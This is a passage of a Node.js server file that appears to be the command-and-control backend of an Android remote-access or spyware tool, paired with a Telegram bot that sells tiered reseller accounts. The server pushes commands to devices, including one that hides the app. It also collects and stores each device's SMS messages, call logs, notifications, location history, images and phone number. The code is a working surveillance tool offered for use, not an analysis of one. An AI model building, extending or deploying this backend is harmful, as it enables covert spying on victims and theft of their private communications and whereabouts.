    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'flashlight_on',
        timestamp: Date.now()
    };
    
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `Flashlight ON command sent to ${device}`,
        device,
        command: 'flashlight_on',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/flashlight_off', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'flashlight_off',
        timestamp: Date.now()
    };
    
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `Flashlight OFF command sent to ${device}`,
        device,
        command: 'flashlight_off',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/music/play', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    const url = req.query.url;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    if (!url) {
        return res.json({ success: false, error: 'URL required' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'play_music', 
        url: url,
        timestamp: Date.now()
    };
    
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `Play music command sent to ${device}`,
        device,
        command: 'play_music',
        url: url,
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/music/stop', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'stop_music',
        timestamp: Date.now()
    };
    
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `Stop music command sent to ${device}`,
        device,
        command: 'stop_music',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/app/hide', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'hide_app',
        timestamp: Date.now()
    };
    
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `Hide app command sent to ${device}`,
        device,
        command: 'hide_app',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/app/show', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const client = clients.get(device);
    if (!client || client.readyState !== WebSocket.OPEN) {
        return res.json({ success: false, error: 'Device offline' });
    }
    
    const commandData = { 
        type: 'command', 
        command: 'show_app',
        timestamp: Date.now()
    };
    
    client.send(JSON.stringify(commandData));
    
    res.json({
        success: true,
        message: `Show app command sent to ${device}`,
        device,
        command: 'show_app',
        status: 'delivered',
        time: new Date().toISOString()
    });
});

app.get('/api/location/get', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    const limit = req.query.limit ? parseInt(req.query.limit) : 20;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const locationPath = path.join(getDevicePath(username, device), 'location.json');
    
    if (!fs.existsSync(locationPath)) {
        return res.json({ success: true, locations: [], total: 0, message: 'No location data found' });
    }
    
    try {
        const locations = JSON.parse(fs.readFileSync(locationPath));
        const lastLocation = locations.length > 0 ? locations[locations.length - 1] : null;
        
        const client = clients.get(device);
        const isOnline = client && client.readyState === WebSocket.OPEN;
        
        res.json({
            success: true,
            device,
            username,
            locations: locations.slice(-limit).reverse(),
            last_location: lastLocation,
            total: locations.length,
            online: isOnline
        });
    } catch (e) {
        res.json({ success: false, error: 'Error reading location data' });
    }
});

app.get('/api/battery/get', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const infoPath = path.join(getDevicePath(username, device), 'info.json');
    
    if (!fs.existsSync(infoPath)) {
        return res.json({ success: false, error: 'No battery data found' });
    }
    
    try {
        const info = JSON.parse(fs.readFileSync(infoPath));
        
        res.json({
            success: true,
            device,
            username,
            battery: info.battery || 0,
            temperature: info.battery_temperature || 0,
            charging: info.charging || false,
            health: info.battery_health || 'Unknown',
            voltage: info.battery_voltage || 0,
            technology: info.battery_technology || 'Unknown',
            last_seen: info.last_seen
        });
    } catch (e) {
        res.json({ success: false, error: 'Error reading battery data' });
    }
});

app.get('/api/notifications/get', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    const limit = req.query.limit ? parseInt(req.query.limit) : 50;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const notifPath = path.join(getDevicePath(username, device), 'notifications.json');
    
    if (!fs.existsSync(notifPath)) {
        return res.json({ success: true, notifications: [], total: 0, unread: 0 });
    }
    
    try {
        const notifications = JSON.parse(fs.readFileSync(notifPath));
        const unread = notifications.filter(n => !n.read).length;
        
        const client = clients.get(device);
        const isOnline = client && client.readyState === WebSocket.OPEN;
        
        res.json({
            success: true,
            device,
            username,
            notifications: notifications.slice(-limit).reverse(),
            total: notifications.length,
            unread,
            online: isOnline
        });
    } catch (e) {
        res.json({ success: false, error: 'Error reading notifications' });
    }
});

app.get('/api/device/info', (req, res) => {
    const device = req.query.device;
    const username = req.query.username;
    
    if (!device || !username) {
        return res.json({ success: false, error: 'Device and username required' });
    }
    
    const infoPath = path.join(getDevicePath(username, device), 'info.json');
    
    if (!fs.existsSync(infoPath)) {
        return res.json({ success: false, error: 'Device not found' });
    }
    
    try {
        const info = JSON.parse(fs.readFileSync(infoPath));
        const isOnline = clients.has(device) && clients.get(device).readyState === WebSocket.OPEN;
        
        res.json({
            success: true,
            device,
            username,
            model: info.model || 'Unknown',
            android_version: info.android_version || 'Unknown',
            sdk_version: info.sdk_version || 0,
            manufacturer: info.manufacturer || 'Unknown',
            brand: info.brand || 'Unknown',
            phone_number: info.phone_number || 'Unknown',
            sim_operator: info.sim_operator || 'Unknown',
            battery: info.battery || 0,
            temperature: info.battery_temperature || 0,
            charging: info.charging || false,
            first_seen: info.first_seen,
            last_seen: info.last_seen,
            status: isOnline ? 'online' : 'offline'
        });
    } catch (e) {
        res.json({ success: false, error: 'Error reading device info' });
    }
});

wss.on('connection', (ws) => {
    let currentDevice = null;
    let currentUsername = null;
    let pingInterval = null;
    
    ws.on('message', (data) => {
        try {
            const msg = JSON.parse(data);
            
            if (msg.type === 'auth') {
                currentUsername = msg.username;
                currentDevice = msg.device_id;
                
                logInfo(`Device connected: ${currentDevice} (${msg.model})`);
                
                const devicePath = getDevicePath(currentUsername, currentDevice);
                if (!fs.existsSync(devicePath)) {
                    fs.mkdirSync(devicePath, { recursive: true });
                }
                
                clients.set(currentDevice, ws);
                
                const infoPath = path.join(devicePath, 'info.json');
                let info = {};
                
                if (fs.existsSync(infoPath)) {
                    try {
                        info = JSON.parse(fs.readFileSync(infoPath));
                    } catch (e) {}
                }
                
                info.device_id = currentDevice;
                info.username = currentUsername;
                info.model = msg.model;
                info.battery = msg.battery || 0;
                info.last_seen = new Date().toISOString();
                info.first_seen = info.first_seen || new Date().toISOString();
                
                fs.writeFileSync(infoPath, JSON.stringify(info, null, 2));
                
                ws.send(JSON.stringify({ 
                    type: 'auth_success', 
                    message: 'Authentication successful',
                    timestamp: Date.now() 
                }));
                
                if (pingInterval) clearInterval(pingInterval);
                pingInterval = setInterval(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
                    }
                }, 10000);
            }
            
            if (msg.type === 'device_info' && currentUsername && currentDevice) {
                const devicePath = getDevicePath(currentUsername, currentDevice);
                const infoPath = path.join(devicePath, 'info.json');
                let info = {};
                
                if (fs.existsSync(infoPath)) {
                    try {
                        info = JSON.parse(fs.readFileSync(infoPath));
                    } catch (e) {}
                }
                
                Object.assign(info, msg);
                info.last_seen = new Date().toISOString();
                
                fs.writeFileSync(infoPath, JSON.stringify(info, null, 2));
                logInfo(`Device info received from ${currentDevice}`);
            }
            
            if (msg.type === 'image' && currentUsername && currentDevice) {
                const devicePath = getDevicePath(currentUsername, currentDevice);
                const imagesPath = path.join(devicePath, 'images');
                
                if (!fs.existsSync(imagesPath)) {
                    fs.mkdirSync(imagesPath, { recursive: true });
                }
                
                const filename = `${msg.image_type}_${Date.now()}.jpg`;
                const filepath = path.join(imagesPath, filename);
                
                const imageBuffer = Buffer.from(msg.data, 'base64');
                fs.writeFileSync(filepath, imageBuffer);
                
                msg.device_id = currentDevice;
                msg.username = currentUsername;
                
                logInfo(`Image received from ${currentDevice}: ${msg.image_type}`);
            }
            
            if (msg.type === 'pong' && currentUsername && currentDevice) {
                const infoPath = path.join(getDevicePath(currentUsername, currentDevice), 'info.json');
                if (fs.existsSync(infoPath)) {
                    try {
                        const info = JSON.parse(fs.readFileSync(infoPath));
                        info.last_seen = new Date().toISOString();
                        fs.writeFileSync(infoPath, JSON.stringify(info, null, 2));
                    } catch (e) {}
                }
            }
            
            if (msg.type === 'location' && currentUsername && currentDevice) {
                const devicePath = getDevicePath(currentUsername, currentDevice);
                const locationPath = path.join(devicePath, 'location.json');
                let locations = [];
                
                if (fs.existsSync(locationPath)) {
                    try {
                        locations = JSON.parse(fs.readFileSync(locationPath));
                    } catch (e) {
                        locations = [];
                    }
                }
                
                const locationData = {
                    lat: msg.lat,
                    lng: msg.lng,
                    accuracy: msg.accuracy || 0,
                    provider: msg.provider || 'unknown',
                    speed: msg.speed || 0,
                    bearing: msg.bearing || 0,
                    altitude: msg.altitude || 0,
                    time: msg.time || Date.now(),
                    time_formatted: msg.time_formatted || new Date().toISOString(),
                    received_at: new Date().toISOString()
                };
                
                locations.push(locationData);
                
                if (locations.length > 200) {
                    locations = locations.slice(-200);
                }
                
                fs.writeFileSync(locationPath, JSON.stringify(locations, null, 2));
                logInfo(`Location received from ${currentDevice}: ${msg.lat}, ${msg.lng}`);
            }
            
            if (msg.type === 'battery' && currentUsername && currentDevice) {
                const infoPath = path.join(getDevicePath(currentUsername, currentDevice), 'info.json');
                
                if (fs.existsSync(infoPath)) {
                    try {
                        const info = JSON.parse(fs.readFileSync(infoPath));
                        info.battery = msg.level;
                        info.battery_temperature = msg.temperature || 0;
                        info.charging = msg.charging || false;
                        info.last_seen = new Date().toISOString();
                        
                        fs.writeFileSync(infoPath, JSON.stringify(info, null, 2));
                    } catch (e) {}
                }
            }
            
            if (msg.type === 'notification' && currentUsername && currentDevice) {
                const devicePath = getDevicePath(currentUsername, currentDevice);
                const notifPath = path.join(devicePath, 'notifications.json');
                let notifications = [];
                
                if (fs.existsSync(notifPath)) {
                    try {
                        notifications = JSON.parse(fs.readFileSync(notifPath));
                    } catch (e) {
                        notifications = [];
                    }
                }
                
                const notificationData = {
                    id: Date.now() + Math.random().toString(36).substring(7),
                    app: msg.app || 'unknown',
                    package: msg.package || 'unknown',
                    title: msg.title || '',
                    content: msg.content || '',
                    time: msg.time || Date.now(),
                    time_formatted: msg.time_formatted || new Date().toISOString(),
                    received_at: new Date().toISOString(),
                    read: false
                };
                
                notifications.push(notificationData);
                
                if (notifications.length > 500) {
                    notifications = notifications.slice(-500);
                }
                
                fs.writeFileSync(notifPath, JSON.stringify(notifications, null, 2));
                logInfo(`Notification from ${currentDevice}: ${msg.app} - ${msg.title}`);
            }
            
            if (msg.type === 'sms' && currentUsername && currentDevice) {
                const devicePath = getDevicePath(currentUsername, currentDevice);
                const smsPath = path.join(devicePath, 'sms.json');
                let smsList = [];
                
                if (fs.existsSync(smsPath)) {
                    try {
                        smsList = JSON.parse(fs.readFileSync(smsPath));
                    } catch (e) {
                        smsList = [];
                    }
                }
                
                smsList.push(msg);
                
                if (smsList.length > 500) {
                    smsList = smsList.slice(-500);
                }
                
                fs.writeFileSync(smsPath, JSON.stringify(smsList, null, 2));
                logInfo(`SMS from ${currentDevice}: ${msg.address}`);
            }
            
            if (msg.type === 'call' && currentUsername && currentDevice) {
                const devicePath = getDevicePath(currentUsername, currentDevice);
                const callPath = path.join(devicePath, 'calls.json');
                let callList = [];
                
                if (fs.existsSync(callPath)) {
                    try {
                        callList = JSON.parse(fs.readFileSync(callPath));
                    } catch (e) {
                        callList = [];
                    }
                }
                
                callList.push(msg);
                
                if (callList.length > 500) {
                    callList = callList.slice(-500);
                }
                
                fs.writeFileSync(callPath, JSON.stringify(callList, null, 2));
                logInfo(`Call from ${currentDevice}: ${msg.call_number}`);
            }
            
            if (msg.type === 'command_received' && currentDevice) {
                logInfo(`Command ${msg.command} executed on ${currentDevice}`);
            }
            
        } catch (e) {
            logError("WebSocket error:", e.message);
        }
    });
    
    ws.on('close', () => {
        if (pingInterval) clearInterval(pingInterval);
        if (currentDevice) clients.delete(currentDevice);
        logInfo(`Device disconnected: ${currentDevice || 'unknown'}`);
    });
    
    ws.on('error', (err) => {
        logError("WebSocket client error:", err.message);
    });
});


bot.onText(/^\/(add|del)(owner|admin|reseller)\s*(.*)/i, async (msg, match) => {
  const action = match[1];
  const type = match[2];
  const input = match[3];
  await handleUserManagement(msg, input, type, action);
});

bot.onText(/\/start/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userStatus = getUserStatus(userId);
  const fullName = `${msg.from.first_name || ''} ${msg.from.last_name || ''}`.trim();
  const username = msg.from.username || fullName;

  let menuText = `<blockquote><b>
━━━━━━━━━━━━━━━━━━━━━━━━━
▢ USER : @${username}
▢ ID : <code>${userId}</code>
▢ STATUS : ${userStatus}
━━━━━━━━━━━━━━━━━━━━━━━━━`;

  if (!hasAccess(userId)) {
    menuText += `
~ ▢ /createacc`;
  }

  if (hasAccess(userId)) {
    menuText += `
~ ▢ /adduser username,expired
~ ▢ /listuser
~ ▢ /add (owner admin reseller)
~ ▢ /del (owner admin reseller)`;
  }

  menuText += `
━━━━━━━━━━━━━━━━━━━━━━━━━</b></blockquote>`;

  const opts = {
    caption: menuText,
    reply_to_message_id: msg.message_id,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: 'Developer', url: `https://t.me/primroseell` }]
      ]
    }
  };

  await bot.sendAnimation(chatId, 'https://files.catbox.moe/xhjb2x.mp4', opts);
  logInfo(`Bot started by user: ${userId}`);
});

bot.onText(/^\/adduser (.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userStatus = getUserStatus(userId);
  const input = match[1].split(",");
  
  if (!hasAccess(userId)) {
    return bot.sendMessage(chatId, "❌ You don't have permission to use this command!");
  }
  
  if (msg.chat.type !== 'private') return;
  
  if (input.length < 2) {
    return bot.sendMessage(chatId, "Format: /adduser username,expiry\nExample: /adduser john,30", { parse_mode: "Markdown" });
  }
  
  const [username, expiry] = input.map(item => item.trim());
  const password = username + Math.floor(Math.random() * 1000);
  const users = loadDatabase();
  const expiryDays = parseInt(expiry);
  
  if (isNaN(expiryDays)) {
    return bot.sendMessage(chatId, "❌ Expiry must be a number!");
  }
  
  if (users.find(u => u.username === username)) return bot.sendMessage(chatId, "❌ Username sudah ada!");
  
  let inlineKeyboard = { inline_keyboard: [] };
  
  if (isDeveloper(userId)) {
    inlineKeyboard.inline_keyboard = [
      [{ text: 'Member', callback_data: `adduser_${username}_member_${expiry}_${password}` }],
      [{ text: 'Reseller', callback_data: `adduser_${username}_reseller_${expiry}_${password}` }],
      [{ text: 'Admin', callback_data: `adduser_${username}_admin_${expiry}_${password}` }],
      [{ text: 'Owner', callback_data: `adduser_${username}_owner_${expiry}_${password}` }]
    ];
  } else if (isOwner(userId)) {
    inlineKeyboard.inline_keyboard = [
      [{ text: 'Admin', callback_data: `adduser_${username}_admin_${expiry}_${password}` }],
      [{ text: 'Member', callback_data: `adduser_${username}_member_${expiry}_${password}` }],
      [{ text: 'Reseller', callback_data: `adduser_${username}_reseller_${expiry}_${password}` }]
    ];
  } else if (isAdmin(userId)) {
    inlineKeyboard.inline_keyboard = [
      [{ text: 'Member', callback_data: `adduser_${username}_member_${expiry}_${password}` }],
      [{ text: 'Reseller', callback_data: `adduser_${username}_reseller_${expiry}_${password}` }]
    ];
  } else if (isReseller(userId)) {
    inlineKeyboard.inline_keyboard = [
      [{ text: 'Member', callback_data: `adduser_${username}_member_${expiry}_${password}` }]
    ];
  }

  if (inlineKeyboard.inline_keyboard.length > 0) {
    return bot.sendMessage(
      chatId,
      `Select role for user *${username}*:\nExpiry: ${expiryDays} days\nPassword will be auto-generated.`,
      { parse_mode: "Markdown", reply_markup: inlineKeyboard }
    );
  }
});

bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;
  const userId = query.from.id;

  if (data.startsWith("adduser_")) {
    const parts = data.replace("adduser_", "").split("_");
    if (parts.length < 4) return;

    const [username, role, expiry, password] = parts;

    if (role === 'owner' && !isDeveloper(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "Only developer can create owner!" });
    }
    
    if (role === 'admin' && !isOwner(userId) && !isDeveloper(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "No permission to create admin!" });
    }
    
    if (role === 'reseller' && !isAdmin(userId) && !isOwner(userId) && !isDeveloper(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "No permission to create resellers!" });
    }

    if (role === 'member' && !hasAccess(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "No permission to create users!" });
    }
    
    const users = loadDatabase();
    const expiryDays = parseInt(expiry);
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + expiryDays);
    
    if (users.find(u => u.username === username)) {
      return bot.answerCallbackQuery(query.id, { text: "Username already exists!" });
    }
    
    users.push({ username, password, role, expiredDate: expiryDate.toISOString().split("T")[0] });
    saveDatabase(users);
    
    logSuccess(`User ${username} created with role ${role} by ${userId}`);
    
    bot.editMessageText(
      `User *${username}* successfully added!\n` +
      `Password: \`${password}\`\n` +
      `Role: ${role}\n` +
      `Expired: ${expiryDate.toISOString().split('T')[0]}`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: "Markdown"
      }
    );
    bot.answerCallbackQuery(query.id, { text: `User ${username} created as ${role}!` });
  }

  if (data.startsWith("view_")) {
    const username = data.replace("view_", "");
    const users = loadDatabase();
    const user = users.find(u => u.username === username);

    if (!user) {
      return bot.answerCallbackQuery(query.id, { text: "User not found!" });
    }

    const viewerRole = getUserStatus(userId);
    const targetRole = user.role;
    
    if (viewerRole === 'No Access') {
      return bot.answerCallbackQuery(query.id, { text: "No permission to view this user!" });
    }
    
    if (viewerRole === 'reseller' && targetRole !== 'member') {
      return bot.answerCallbackQuery(query.id, { text: "No permission to view this user!" });
    }
    
    if (viewerRole === 'admin' && targetRole === 'admin') {
      return bot.answerCallbackQuery(query.id, { text: "No permission to view this user!" });
    }
     
    if (viewerRole === 'owner' && targetRole === 'owner') {
      return bot.answerCallbackQuery(query.id, { text: "No permission to view this user!" });
    }

    const maskedPassword = "*".repeat(user.password.length);

    let buttons = [];
    const canDelete = checkDeletePermission(userId, user);
    
    if (canDelete) {
      buttons.push([{ text: "🗑 Delete User", callback_data: `delete_${user.username}` }]);
    }

    buttons.push([{ text: "🔙 Back", callback_data: "back_list" }]);

    bot.editMessageText(
      `👤 *User Details*\n` +
      `• Username: *${user.username}*\n` +
      `• Password: \`${maskedPassword}\`\n` +
      `• Role: *${user.role}*\n` +
      `• Expired: *${user.expiredDate}*`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: buttons }
      }
    );
  }

  if (data.startsWith("delete_")) {
    const username = data.replace("delete_", "");
    const userId = query.from.id;

    const users = loadDatabase();
    const userToDelete = users.find(u => u.username === username);

    if (!userToDelete) {
      return bot.answerCallbackQuery(query.id, { text: "User not found!" });
    }
    
    const canDelete = checkDeletePermission(userId, userToDelete);
    
    if (!canDelete) {
      return bot.answerCallbackQuery(query.id, { text: "No permission to delete this user!" });
    }
    
    const updatedUsers = users.filter(u => u.username !== username);
    saveDatabase(updatedUsers);
    
    logSuccess(`User ${username} deleted by ${userId}`);
    bot.answerCallbackQuery(query.id, { text: `User ${username} deleted!` });

    const filteredUsers = updatedUsers.filter(u => {
      const viewerRole = getUserStatus(userId);
      const targetRole = u.role;
      if (viewerRole === 'reseller' && targetRole !== 'member') return false;
      if (viewerRole === 'owner' && targetRole === 'owner') return false;
      return true;
    });

    const buttons = filteredUsers.map(u => [
      { text: `${u.username} (${u.role})`, callback_data: `view_${u.username}` }
    ]);
    
    let messageText = "📭 No registered users.";
    if (filteredUsers.length > 0) {
      messageText = `📂 *User List:* (${filteredUsers.length} users)`;
    }
    
    bot.editMessageText(messageText, {
      chat_id: chatId,
      message_id: query.message.message_id,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });
  }
  
  if (data === "back_list") {
    const userId = query.from.id;
    const users = loadDatabase();
    const filteredUsers = users.filter(u => {
      const viewerRole = getUserStatus(userId);
      const targetRole = u.role;
      if (viewerRole === 'reseller' && targetRole !== 'member') return false;
      if (viewerRole === 'owner' && targetRole === 'owner') return false;
      return true;
    });
    
    const buttons = filteredUsers.map(u => [
      { text: `${u.username} (${u.role})`, callback_data: `view_${u.username}` }
    ]);
    
    let messageText = "📭 No registered users.";
    if (filteredUsers.length > 0) {
      messageText = `📂 *User List:* (${filteredUsers.length} users)`;
    }
    
    bot.editMessageText(messageText, {
      chat_id: chatId,
      message_id: query.message.message_id,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });
  }
});

bot.onText(/^\/listuser$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (!hasAccess(userId)) {
    return bot.sendMessage(chatId, "❌ You don't have permission to use this command!");
  }

  const users = loadDatabase();
  const userStatus = getUserStatus(userId);

  let filteredUsers = users;
  
  if (userStatus === 'Reseller') {
    filteredUsers = users.filter(u => u.role === 'member');
  } else if (userStatus === 'Admin') {
    filteredUsers = users.filter(u => u.role === 'member' || u.role === 'reseller');
  }

  if (filteredUsers.length === 0) {
    return bot.sendMessage(chatId, "📭 No users found.");
  }

  const buttons = filteredUsers.map(u => {
    return [{ text: `${u.username} (${u.role})`, callback_data: `view_${u.username}` }];
  });

  bot.sendMessage(chatId, `📂 *User List:* (${filteredUsers.length} users)`, {
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: buttons }
  });
});

bot.onText(/\/createacc/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  const botUsers = readBotUsers();
  const existingUser = botUsers.find(u => u.telegramId === userId);
  
  if (existingUser) {
    return bot.sendMessage(chatId, "❌ You can only create one account per lifetime!");
  }
  
  const requiredChannels = ["@atheriaapps"];
  
  try {
    const subscriptionChecks = await Promise.all(
      requiredChannels.map(async (channel) => {
        const member = await bot.getChatMember(channel, userId);
        return {
          channel,
          isSubscribed: member.status === 'member' || 
                        member.status === 'administrator' || 
                        member.status === 'creator'
        };
      })
    );
    
    const notSubscribed = subscriptionChecks.filter(check => !check.isSubscribed);
    
    if (notSubscribed.length > 0) {
      const channelList = notSubscribed.map((check, index) => 
        `${index + 1}. ${check.channel}`
      ).join('\n');
      
      return bot.sendMessage(chatId,
        `⚠️ *Please subscribe to all required channels first:\n` +
        `${channelList}` +
        `After subscribing to ALL channels, use /createacc again.*`,
        { parse_mode: "Markdown" }
      );
    }
  } catch (error) {
    logError('Subscription check error:', error);
    return bot.sendMessage(chatId, 
      `❌ Error checking subscriptions: ${error.message}\n` +
      `Please make sure the bot is added as admin in all channels.`
    );
  }
  
  const telegramUsername = msg.from.username || `user${userId}`;
  const cleanUsername = telegramUsername.replace(/[^a-zA-Z0-9]/g, '');
  
  if (!cleanUsername) {
    return bot.sendMessage(chatId, "❌ Invalid Telegram username. Please set a username with letters/numbers first.");
  }
  
  let finalUsername = cleanUsername;
  const panelUsers = loadDatabase();
  
  let counter = 1;
  while (panelUsers.find(u => u.username === finalUsername)) {
    finalUsername = `${cleanUsername}${counter}`;
    counter++;
  }
  
  const password = finalUsername + Math.floor(Math.random() * 1000);
  const expiryDays = 7;
  const allowedRole = 'member';
  const expiryDate = new Date();
  expiryDate.setDate(expiryDate.getDate() + expiryDays);
  
  panelUsers.push({
    username: finalUsername,
    password: password,
    role: 'member',
    expiredDate: expiryDate.toISOString().split('T')[0]
  });

  const updatedBotUsers = readBotUsers();
  updatedBotUsers.push({
    telegramId: userId,
    telegramUsername: msg.from.username || 'no_username',
    createdAt: new Date().toISOString(),
    chatId: chatId
  });
  
  const panelSuccess = saveDatabase(panelUsers);
  const botSuccess = writeBotUsers(updatedBotUsers);
  
  if (panelSuccess && botSuccess) {
    logSuccess(`Account created via Telegram: ${finalUsername} (${userId})`);
    
    bot.sendMessage(chatId, `*✅ Account created successfully!*\n` +
      `📝 *Credentials:*\n` +
      `Username: \`${finalUsername}\`\n` +
      `Password: \`${password}\`\n` +
      `📊 *Account Details:*\n` +
      `Role: ${allowedRole}\n` +
      `Expiry: ${expiryDate.toISOString().split('T')[0]}\n` +
      `Days: ${expiryDays}\n` +
      `⚠️ *Important Notes:*\n` +
      `• Save your credentials securely!\n` +
      `• You cannot create another account!\n` +
      `• Account will expire in ${expiryDays} days`, {
      parse_mode: "Markdown"
    });
    
    bot.sendMessage(OWNER_ID[0],
      `📋 New account created via Telegram Bot\n` +
      `👤 User: @${msg.from.username || 'N/A'} (${userId})\n` +
      `📱 Panel Username: ${finalUsername}\n` +
      `📅 Expiry: ${expiryDays} days\n` +
      `🕐 Created: ${new Date().toLocaleString()}\n` +
      `✅ Subscribed to all ${requiredChannels.length} channels`
    );
  } else {
    logError('Failed to create account for user:', userId);
    bot.sendMessage(chatId, "❌ Failed to create account. Please try again later.");
  }
});

async function startServer() {
  try {
    app.listen(PORT, () => {
      logSuccess(`HTTP Server aktif di http://178.128.90.61:${PORT}`);
    });
    
    server.listen(WSPORT, () => {
      logSuccess(`WebSocket Server aktif di ws://178.128.90.61:${WSPORT}`);
    });
    
    await startUserSessions();
    ToolsController.cleanupExpiredLogins();
    
    logSuccess('All services started successfully');
  } catch (error) {
    logError('Error starting server:', error);
  }
}

const RESTART_INTERVAL = 60 * 60 * 1000;
setInterval(() => {
  logInfo('Scheduled restart in 500ms...');
  setTimeout(() => {
    logInfo('Restarting process...');
    process.exit(0);
  }, 500);
}, RESTART_INTERVAL);

process.on('SIGINT', () => {
  logInfo('Received SIGINT, shutting down...');
  disconnectAllActiveConnections();
  process.exit(0);
});

process.on('SIGTERM', () => {
  logInfo('Received SIGTERM, shutting down...');
  disconnectAllActiveConnections();
  process.exit(0);
});

startServer();
